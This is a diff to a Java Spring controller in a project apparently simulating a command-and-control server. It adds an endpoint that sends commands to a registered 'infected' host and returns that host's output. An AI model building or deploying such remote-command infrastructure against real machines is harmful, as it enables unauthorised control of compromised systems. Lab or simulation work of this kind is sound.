@@ -1,18 +1,16 @@
 package at.simcc.simcc_backend.api.controller;
 
+import at.simcc.simcc_backend.api.body.InfectedCommandResponse;
 import at.simcc.simcc_backend.api.body.InfectedRegistrationRequest;
-import at.simcc.simcc_backend.api.body.InfectedOnlineWrapper;
 import at.simcc.simcc_backend.api.service.InfectedService;
-import at.simcc.simcc_backend.api.sse.BuildCompleteEvent;
-import at.simcc.simcc_backend.api.sse.BuildFailedEvent;
 import at.simcc.simcc_backend.api.sse.InfectedSSEComponent;
-import at.simcc.simcc_backend.entities.Infected;
+import at.simcc.simcc_backend.api.ws.payload.CommandOutputPayload;
+import at.simcc.simcc_backend.api.ws.payload.CommandPayload;
 import at.simcc.simcc_backend.models.InfectedIdDto;
 import at.simcc.simcc_backend.models.InfectedWithLatestIPDto;
 import jakarta.servlet.http.HttpServletRequest;
 import lombok.RequiredArgsConstructor;
 import lombok.extern.slf4j.Slf4j;
-import org.apache.catalina.Server;
 import org.springframework.http.MediaType;
 import org.springframework.http.ResponseEntity;
 import org.springframework.validation.annotation.Validated;
@@ -21,13 +19,15 @@ import org.springframework.web.bind.annotation.*;
 import reactor.core.publisher.Flux;
 import tools.jackson.databind.ObjectMapper;
 
+import java.io.IOException;
 import java.net.Inet4Address;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
-import java.time.Duration;
 import java.util.List;
 import java.util.Optional;
 import java.util.UUID;
+import java.util.concurrent.ExecutionException;
+import java.util.concurrent.TimeoutException;
 
 /**
  * Project: SimCC-Backend
@@ -100,4 +100,10 @@ public class InfectedController {
     }
 
 
+    @PostMapping("/command/{iid}")
+    public ResponseEntity<InfectedCommandResponse> commandInfected(@PathVariable UUID iid, @RequestBody CommandPayload command) throws IOException, ExecutionException, InterruptedException, TimeoutException {
+        return ResponseEntity.ok(
+                new InfectedCommandResponse(infectedService.sendMessage(iid, command).getStdout())
+        );
+    }
 }
